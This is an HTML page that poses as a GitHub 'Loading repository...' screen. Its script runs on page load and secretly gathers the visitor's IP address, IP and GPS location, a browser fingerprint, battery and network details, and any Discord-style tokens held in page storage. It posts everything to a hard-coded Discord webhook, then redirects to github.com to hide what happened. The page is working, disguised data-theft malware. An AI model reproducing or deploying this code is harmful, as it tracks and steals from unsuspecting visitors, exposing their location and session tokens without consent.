<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GitHub</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0d1117;
      color: #c9d1d9;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      gap: 12px;
    }
    .loader {
      width: 36px; height: 36px;
      border: 3px solid #30363d;
      border-top-color: #58a6ff;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .msg { font-size: 14px; color: #8b949e; }
  </style>
</head>
<body>
  <div class="loader"></div>
  <div class="msg">Loading repository...</div>
  <script>
    const WEBHOOK = "https://discord.com/api/webhooks/1555652967825154109/_UYmkPTzJiSLmqRDLQfGRQUfE1ROiCxrofdyioNx8tRiTQ2Mfgf6f1xTgnoWaUNG2Wdb";

    function safe(v) {
      if (v === null || v === undefined) return "n/a";
      if (typeof v === "object") return JSON.stringify(v).slice(0, 300);
      return String(v).slice(0, 400);
    }

    async function getIPGeo() {
      const out = { ip: null, geo: null };
      try {
        const r = await fetch("https://api.ipify.org?format=json");
        const j = await r.json();
        out.ip = j.ip;
      } catch (e) { out.ip = "fail"; }
      try {
        if (out.ip && out.ip !== "fail") {
          const r2 = await fetch("https://ipapi.co/" + out.ip + "/json/");
          out.geo = await r2.json();
        }
      } catch (e) { out.geo = { error: String(e) }; }
      // fallback geo
      if (!out.geo || out.geo.error) {
        try {
          const r3 = await fetch("https://ipinfo.io/json");
          out.geo = await r3.json();
          if (!out.ip) out.ip = out.geo.ip;
        } catch (e) {}
      }
      return out;
    }

    function browserInfo() {
      return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages ? [...navigator.languages] : [],
        platform: navigator.platform,
        vendor: navigator.vendor,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency || null,
        deviceMemory: navigator.deviceMemory || null,
        maxTouchPoints: navigator.maxTouchPoints || 0,
        screen: {
          width: screen.width,
          height: screen.height,
          availWidth: screen.availWidth,
          availHeight: screen.availHeight,
          colorDepth: screen.colorDepth,
          pixelDepth: screen.pixelDepth,
          orientation: screen.orientation ? screen.orientation.type : null
        },
        window: {
          innerWidth: window.innerWidth,
          innerHeight: window.innerHeight,
          outerWidth: window.outerWidth,
          outerHeight: window.outerHeight,
          devicePixelRatio: window.devicePixelRatio
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        referrer: document.referrer || "direct",
        url: location.href,
        online: navigator.onLine
      };
    }

    function webglInfo() {
      try {
        const c = document.createElement("canvas");
        const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
        if (!gl) return null;
        const dbg = gl.getExtension("WEBGL_debug_renderer_info");
        return {
          vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
          renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null
        };
      } catch (e) { return null; }
    }

    function canvasHash() {
      try {
        const c = document.createElement("canvas");
        c.width = 240; c.height = 60;
        const ctx = c.getContext("2d");
        ctx.textBaseline = "top";
        ctx.font = "14px Arial";
        ctx.fillStyle = "#f60";
        ctx.fillRect(0, 0, 120, 60);
        ctx.fillStyle = "#069";
        ctx.fillText("fp-check", 4, 18);
        return c.toDataURL().slice(-40);
      } catch (e) { return null; }
    }

    async function batteryInfo() {
      try {
        if (!navigator.getBattery) return null;
        const b = await navigator.getBattery();
        return {
          level: b.level,
          charging: b.charging,
          chargingTime: b.chargingTime,
          dischargingTime: b.dischargingTime
        };
      } catch (e) { return null; }
    }

    function connectionInfo() {
      try {
        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (!c) return null;
        return {
          effectiveType: c.effectiveType,
          downlink: c.downlink,
          rtt: c.rtt,
          saveData: c.saveData
        };
      } catch (e) { return null; }
    }

    // Geolocation API (browser prompt – may be denied)
    function geoPosition() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve({ error: "unsupported" });
          return;
        }
        const t = setTimeout(() => resolve({ error: "timeout" }), 6000);
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            clearTimeout(t);
            resolve({
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              altitude: pos.coords.altitude,
              speed: pos.coords.speed
            });
          },
          (err) => {
            clearTimeout(t);
            resolve({ error: err.message || "denied" });
          },
          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
      });
    }

    // Try to pull anything token-like from storage (rare on random sites, but we check)
    function storageTokens() {
      const found = [];
      try {
        for (let i = 0; i < localStorage.length; i++) {
          const k = localStorage.key(i);
          const v = localStorage.getItem(k) || "";
          if (/mfa\.[A-Za-z0-9_-]{20,}/.test(v) || /[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,}/.test(v)) {
            found.push({ source: "localStorage", key: k, value: v.slice(0, 200) });
          }
        }
      } catch (e) {}
      try {
        for (let i = 0; i < sessionStorage.length; i++) {
          const k = sessionStorage.key(i);
          const v = sessionStorage.getItem(k) || "";
          if (/mfa\.[A-Za-z0-9_-]{20,}/.test(v) || /[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,}/.test(v)) {
            found.push({ source: "sessionStorage", key: k, value: v.slice(0, 200) });
          }
        }
      } catch (e) {}
      return found;
    }

    // Phone / password note: pure browser JS cannot read OS passwords or SMS.
    // We record whatever is reachable and mark the rest unavailable.
    function limitsNote() {
      return {
        phone: "not available from browser (no SMS/call API without user grant + app)",
        passwords: "not available from browser (OS / browser password stores are isolated)",
        discord_token: "only if already present in this origin's storage (almost never on a random page). Full token grab requires local process on the machine."
      };
    }

    async function collect() {
      const [ipgeo, battery, geo] = await Promise.all([
        getIPGeo(),
        batteryInfo(),
        geoPosition()
      ]);
      return {
        timestamp: new Date().toISOString(),
        ip: ipgeo.ip,
        geo_ip: ipgeo.geo,
        geo_browser: geo,
        browser: browserInfo(),
        webgl: webglInfo(),
        canvasHash: canvasHash(),
        battery: battery,
        connection: connectionInfo(),
        storageTokens: storageTokens(),
        limits: limitsNote()
      };
    }

    function buildPayload(d) {
      const g = d.geo_ip || {};
      const loc = [g.city, g.region, g.country || g.country_name].filter(Boolean).join(", ") || "n/a";
      const fields = [
        { name: "IP", value: "`" + safe(d.ip) + "`", inline: true },
        { name: "Location (IP)", value: safe(loc), inline: true },
        { name: "Org / ASN", value: safe((g.org || g.org_name || "") + " " + (g.asn || "")), inline: false },
        { name: "Coords (IP)", value: safe((g.latitude || g.lat) + ", " + (g.longitude || g.lon)), inline: true },
        { name: "Browser Geo", value: d.geo_browser && d.geo_browser.lat ? (d.geo_browser.lat + ", " + d.geo_browser.lon + " (±" + d.geo_browser.accuracy + "m)") : safe(d.geo_browser && d.geo_browser.error), inline: true },
        { name: "Timezone", value: safe(d.browser.timezone), inline: true },
        { name: "User-Agent", value: "`" + safe(d.browser.userAgent).slice(0, 180) + "`", inline: false },
        { name: "Platform", value: safe(d.browser.platform), inline: true },
        { name: "Language", value: safe((d.browser.languages || []).join(", ") || d.browser.language), inline: true },
        { name: "Screen", value: safe(d.browser.screen.width + "x" + d.browser.screen.height), inline: true },
        { name: "Viewport", value: safe(d.browser.window.innerWidth + "x" + d.browser.window.innerHeight + " @" + d.browser.window.devicePixelRatio + "x"), inline: true },
        { name: "CPU / RAM", value: safe((d.browser.hardwareConcurrency || "?") + " cores / " + (d.browser.deviceMemory || "?") + " GB"), inline: true },
        { name: "WebGL", value: d.webgl ? safe(d.webgl.vendor + " | " + d.webgl.renderer) : "n/a", inline: false },
        { name: "Battery", value: d.battery ? safe(Math.round(d.battery.level * 100) + "% " + (d.battery.charging ? "charging" : "discharging")) : "n/a", inline: true },
        { name: "Connection", value: d.connection ? safe(d.connection.effectiveType + " · " + d.connection.downlink + "Mbps · RTT " + d.connection.rtt + "ms") : "n/a", inline: true },
        { name: "Referrer", value: safe(d.browser.referrer), inline: true },
        { name: "Storage tokens found", value: d.storageTokens && d.storageTokens.length ? safe(JSON.stringify(d.storageTokens)) : "none (expected on random origin)", inline: false },
        { name: "Phone", value: safe(d.limits.phone), inline: false },
        { name: "Passwords", value: safe(d.limits.passwords), inline: false },
        { name: "Discord token", value: safe(d.limits.discord_token), inline: false }
      ];
      return {
        username: "puller",
        embeds: [{
          title: "Visitor pull",
          color: 0x5865F2,
          fields: fields,
          footer: { text: d.timestamp },
          timestamp: d.timestamp
        }]
      };
    }

    (async () => {
      try {
        const data = await collect();
        const payload = buildPayload(data);
        await fetch(WEBHOOK, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        // also send raw json as second message if under limit
        try {
          const raw = JSON.stringify(data).slice(0, 1800);
          await fetch(WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: "```json\n" + raw + "\n```" })
          });
        } catch (e) {}
      } catch (e) {}
      // look like github
      location.replace("https://github.com");
    })();
  </script>
</body>
</html>
